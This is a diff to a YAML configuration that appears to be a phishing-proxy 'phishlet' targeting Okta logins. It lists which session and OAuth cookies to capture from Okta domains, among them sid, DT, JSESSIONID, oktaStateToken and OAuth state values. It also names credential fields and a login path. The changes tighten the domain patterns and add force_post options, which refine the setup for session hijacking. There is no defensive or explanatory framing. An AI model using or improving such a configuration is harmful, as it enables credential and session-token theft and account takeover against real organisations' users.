@@ -22,29 +22,32 @@ sub_filters:
 
 auth_tokens:
   # Primary Okta authentication cookies (works with any Okta domain)
-  - domain: '.*.okta.com'
+  - domain: '.okta.com'
     keys: ['sid', 'DT', 'idx', 'JSESSIONID', 'oktaStateToken']
     type: 'cookie'
+    force_post: false
   
-  - domain: '.*.oktapreview.com'
+  - domain: '.oktapreview.com'
     keys: ['sid', 'DT', 'idx', 'JSESSIONID', 'oktaStateToken']
     type: 'cookie'
+    force_post: false
   
-  - domain: '.*.okta-emea.com'
+  - domain: '.okta-emea.com'
     keys: ['sid', 'DT', 'idx', 'JSESSIONID', 'oktaStateToken']
     type: 'cookie'
+    force_post: false
   
   # Device trust and session cookies
-  - domain: '.*.okta.com'
+  - domain: '.okta.com'
     keys: ['t', 'dt', 'BC_BANDWIDTH', 'ADRUM', 'ADRUM_BT']
     type: 'cookie'
-    optional: true
+    force_post: false
   
   # OAuth and OIDC tokens
-  - domain: '.*.okta.com'
+  - domain: '.okta.com'
     keys: ['okta-oauth-nonce', 'okta-oauth-state', 'okta-oauth-redirect-params']
     type: 'cookie'
-    optional: true
+    force_post: false
 
 credentials:
   username:
@@ -106,6 +109,6 @@ auth_urls:
   - '/home/'
 
 login:
-  domain: '*.okta.com'
+  domain: 'login.okta.com'
   path: '/login/login.htm'
 
